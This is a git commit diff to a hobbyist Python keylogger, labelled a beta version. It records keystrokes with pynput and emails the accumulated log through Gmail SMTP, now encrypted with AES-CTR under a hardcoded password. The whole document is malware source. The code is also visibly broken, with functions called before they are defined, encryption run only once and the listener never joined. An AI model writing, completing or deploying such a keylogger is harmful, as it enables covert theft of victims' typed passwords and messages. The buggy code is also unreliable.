905462ff384040c699af4ddb33a21daa08a26c63
ctc <86436966+praecantat0r@users.noreply.github.com>
2021-07-22 03:16:53 +0200

    beta version
    fixed encryption , no error code only something doesnt work properly, looks a lot better than before

--- keylogger.py
+++ keylogger.py
@@ -4,12 +4,10 @@
 import getpass
 import smtplib
 import Cryptodome
+import pyaes, pbkdf2, binascii, os, secrets
 from pynput.keyboard import Key, Listener
-from Crypto.Random import get_random_bytes
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
 
-key_location = input('Enter the location that you want your key to be stored: ') #Location of our AES key !CHANGE THIS!
+
 
 
 # Logo
@@ -32,11 +30,11 @@ password = getpass.getpass(prompt='Password: ', stream=None)
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
-#building the keylogger
+#building the keylogger function
 data_to_be_encrypted = ''
 full_log = ''
 word = ''
-email_char_lim = 100
+email_char_lim = 10
 
 def on_press(key):
     global word
@@ -48,7 +46,7 @@ def on_press(key):
         full_log += word
         word = ''
     if len(full_log) >= email_char_lim:
-            data_to_be_encrypted
+            full_log = data_to_be_encrypted
             full_log = ''
     elif key == Key.shift_1 or key == Key.shift_r:
            return
@@ -64,45 +62,34 @@ def on_press(key):
 
 #Encryption function
 
-# Generates the key
-key = get_random_bytes(32)
+# We derive a 256-bit AES encryption key from the password
+password = "passw0rd"
+passwordSalt = os.urandom(16)
+key = pbkdf2.PBKDF2(password, passwordSalt).read(32)
 
-# Saves the key to a file
-file_out = open(key_location, "wb") # wb = write bytes
-file_out.write(key)
-file_out.close()
+# Encrypts the plaintext with the given key:
+iv = secrets.randbits(256)
+plaintext = data_to_be_encrypted
+aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
+ciphertext = aes.encrypt(plaintext)
+
+#if ciphertext is the same lenght as email_char_limit everything is reseted
+if len(ciphertext) >= email_char_lim:
+        send_log()
+        data_to_be_encrypted = ''
+        plaintext = ''
+        full_log = ''
+        ciphertext = ''
+     
 
 
-file_in = open(key_location, "rb") # Read bytes
-key_from_file = file_in.read() # This key should be the same
-file_in.close()
-
-
-output_file = 'encrypted_data.bin'
-data = 'data_to_be_encrypted'
-key = 'file_out'
-
-cipher = AES.new(key, AES.MODE_CFB) # CFB mode
-ciphered_data = cipher.encrypt(data) # Only need to encrypt the data, no padding required for this mode
-
-file_out = open(output_file, "wb")
-file_out.write(cipher.iv)
-file_out.write(ciphered_data)
-file_out.close()
-
-#Resets the data and sends it to the mail
-if len(encrypted_data.bin) >= email_char_lim:
-    send_log()
-    data_to_be_encrypted = ''
-    encrypted_data.bin = ''
-
-#Defines the send_log function 
+#This shit ddefines the send_log function 
 def send_log():
     server.sendmail(
           email,
           email,
-          encrypted_data.bin
+          ciphertext
      )
-
+#Listener stuff
 with Listener( on_press=on_press ) as listener:
      listener.join
